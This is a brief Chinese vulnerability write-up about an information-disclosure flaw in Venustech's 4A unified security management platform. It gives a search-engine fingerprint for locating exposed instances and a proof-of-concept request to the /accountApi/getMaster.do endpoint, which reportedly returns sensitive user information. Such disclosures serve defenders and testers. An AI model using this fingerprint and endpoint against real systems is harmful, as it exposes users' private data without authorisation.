# 启明星辰 4A统一安全管控平台 getMaster.do 信息泄漏漏洞

## 漏洞描述

启明星辰 4A统一安全管控平台 getMaster.do 接口存在信息泄漏漏洞，通过发送特定请求包可以获取用户敏感信息

## 漏洞影响

启明星辰 4A统一安全管控平台

## 网络测绘

web.body="cas/css/ace-part2.min.css"

## 漏洞复现

登陆页面

![image-20230828144032254](images/image-20230828144032254.png)

验证POC

```
/accountApi/getMaster.do
```

![image-20230828144049975](images/image-20230828144049975.png)